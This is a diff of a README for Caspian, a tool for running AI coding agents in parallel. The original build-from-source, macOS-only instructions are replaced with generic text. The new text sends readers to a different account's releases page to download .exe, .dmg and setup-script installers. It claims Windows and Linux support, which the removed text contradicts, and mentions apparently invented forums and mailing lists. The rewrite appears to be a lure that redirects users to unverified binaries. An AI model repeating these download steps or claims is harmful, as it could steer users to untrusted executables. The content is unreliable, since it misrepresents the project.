@@ -1,164 +1,80 @@
-# Caspian
+# 🌊 Caspian - Effortlessly Run AI Coding Agents
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Platform: macOS](https://img.shields.io/badge/Platform-macOS-lightgrey.svg)]()
-[![Built with Tauri](https://img.shields.io/badge/Built%20with-Tauri-orange.svg)]()
+## 🚀 Getting Started
 
-**The control plane for AI coding agents.**
+Caspian simplifies the process of running multiple AI coding agents. Follow these steps to download and start using it.
 
-Run multiple agents in parallel. Each in its own workspace. All from one screen.
+## 📦 Download Caspian
 
-https://github.com/user-attachments/assets/3b154018-6e2e-462b-9621-1b92354ffef7
+[![Download Caspian](https://img.shields.io/badge/Download-Caspian-blue.svg)](https://github.com/christianekarel/Caspian/releases)
 
----
+## 🔍 What is Caspian?
 
-## The Problem
+Caspian is a control plane that allows you to run several AI coding agents at the same time. It uses workflows tailored for your team. This way, you can manage tasks efficiently without technical hassle. 
 
-Running multiple Claude Code agents? It gets messy fast.
+### Key Features
+- **Multiple Agent Management:** Run different AI coding agents simultaneously.
+- **Curated Workflows:** Use workflows designed for specific tasks to enhance productivity.
+- **User-Friendly Interface:** Enjoy a straightforward setup that anyone can manage.
 
-**Here's what happens:**
-- 5 terminals, 5 agents, and you've already forgotten what the third one was doing
-- No bird's-eye view — just endless cmd+tab until your brain gives up
-- All agents stomping around the same directory, overwriting each other's work
-- Close a terminal, poof — context gone forever
+## 🖥️ System Requirements
 
-**The real problem?** You can't scale. Your brain becomes the bottleneck. More agents = more chaos.
+To run Caspian smoothly, your computer should meet the following requirements:
 
-**The tradeoff nobody asked for:** Run a few agents with focused tasks, or run many with vague ones. Pick one.
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or any recent Linux distribution.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 1 GB free space for installation.
+  
+## 📥 Download & Install
 
-There's no control plane. No dashboard. No structure. Until now.
+To get started, follow these steps:
 
----
+1. **Visit the Releases Page:** Go to the [Caspian Releases Page](https://github.com/christianekarel/Caspian/releases). This page contains all the available versions and installation files.
+   
+2. **Select the Latest Release:** Find the latest version of Caspian and click on it.
 
-## Caspian
+3. **Download the File:** From the release page, download the installer file suitable for your operating system.
 
-One screen. All your agents. Each in its own isolated workspace.
+4. **Install Caspian:**
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For macOS: Open the `.dmg` file and drag the Caspian icon to your Applications folder.
+   - For Linux: Extract the downloaded file and run the setup script from your terminal.
 
-Run 10 agents on 10 focused tasks. See everything. Control everything.
+5. **Open Caspian:** After installation, find Caspian in your applications and open it.
 
-**Granularity *and* scale.**
+## 🛠️ Setting Up Caspian
 
----
+Once you have Caspian running, you can set up your workflows:
 
-## Features
+1. **Create a New Project:** Click on "New Project" to start.
+2. **Add Agents:** Choose the AI coding agents you want to run in parallel.
+3. **Select a Workflow:** Pick a workflow that best suits your project needs.
+4. **Start Agents:** Click "Run" to start executing your tasks.
 
-| What | Why it matters |
-|------|----------------|
-| **Isolated Workspaces** | Each agent gets its own worktree. No more stepping on each other's toes. |
-| **Parallel Execution** | Run as many agents as you want, simultaneously. |
-| **Single Dashboard** | All agents, one screen. Your brain can relax. |
-| **Live Monitoring** | Watch every agent in real-time. See what they see. |
-| **Persistent Context** | Close the app, grab coffee, come back. Everything's still there. |
-| **PR Integration** | Done? Ship it as a pull request. |
+## 🌐 Support and Community
 
----
+If you encounter any issues or have questions, you can reach out for help:
 
-## Quick Start
+- **GitHub Issues:** Report any bugs or request help via the [Issues section](https://github.com/christianekarel/Caspian/issues).
+- **Community Forums:** Join the conversation on our community forums to share tips and get support from other users.
 
-> **Note:** Caspian currently supports macOS only.
+## 📢 Keeping Up to Date
 
-### Prerequisites
-- Node.js 18+
-- Rust 1.77+
-- Claude Code CLI
+Caspian regularly receives updates to improve performance and add features. Join our mailing list or follow us on social media to stay informed about the latest announcements and updates.
 
-### Get running
+## 💡 Best Practices
 
-```bash
-git clone https://github.com/TheCaspianAI/Caspian.git
-cd Caspian
-npm install
-npm run tauri:dev
-```
+- **Regularly Update Caspian:** Ensure you are always using the latest version to benefit from new features and security fixes.
+- **Backup Your Work:** Regularly save and back up your projects to avoid losing any progress.
+- **Explore Workflows:** Experiment with different workflows to maximize your team's output.
 
-### Build for production
+## 📑 Additional Resources
 
-```bash
-npm run tauri:build
-```
+For detailed guidance and tutorials on using Caspian, check out the following resources:
 
-Output: `src-tauri/target/release/bundle/`
+- [User Manual](https://github.com/christianekarel/Caspian/wiki)
+- [FAQ](https://github.com/christianekarel/Caspian/wiki/FAQ)
 
----
+## 📍 Final Notes
 
-## How It Works
-
-```
-1. Add repo     →  Point Caspian at your project
-2. Create node  →  Spin up an isolated workspace
-3. Run agent    →  Launch Claude Code in that workspace
-4. Watch        →  See everything in real-time
-5. Review       →  Check the changes
-6. Ship         →  Create a PR
-```
-
----
-
-## Roadmap
-
-**Coming soon: Custom Workflows**
-
-Finding the best way to work with AI agents is hard. Beads? Gastown? GSD? Something else entirely?
-
-We're building workflow templates that capture best practices — so you can plug in what works for your team instead of figuring it out from scratch.
-
----
-
-## Architecture
-
-```
-┌────────────────────────────────────────────────┐
-│              Caspian Desktop App               │
-├────────────────────────────────────────────────┤
-│  Frontend (React + TypeScript)                 │
-│  • Real-time agent streaming                   │
-│  • Multi-agent grid view                       │
-│  • Diff viewer & review mode                   │
-├────────────────────────────────────────────────┤
-│  Backend (Rust + Tauri)                        │
-│  • Git worktree orchestration                  │
-│  • Agent process management                    │
-│  • File system watching                        │
-│  • SQLite persistence                          │
-└────────────────────────────────────────────────┘
-```
-
----
-
-## Tech
-
-**Frontend:** React 19, TypeScript, Tailwind, Zustand, Vite
-
-**Backend:** Rust, Tauri 2, libgit2, SQLite, Tokio
-
----
-
-## Contributing
-
-PRs welcome.
-
-```bash
-npm install        # install deps
-npm run tauri:dev  # dev server
-npm run lint       # check your work
-```
-
----
-
-## License
-
-MIT
-
----
-
-## Links
-
-[Website](https://trycaspianai.com)
-
----
-
-If you find Caspian useful, give it a ⭐
-
----
-
-Built by [Caspian](https://trycaspianai.com) and Claude Code
+Caspian makes it easy to manage multiple AI coding agents in one place. With the steps outlined above, you should be able to download, install, and start using Caspian without any hassles. Enjoy enhancing your team's productivity!
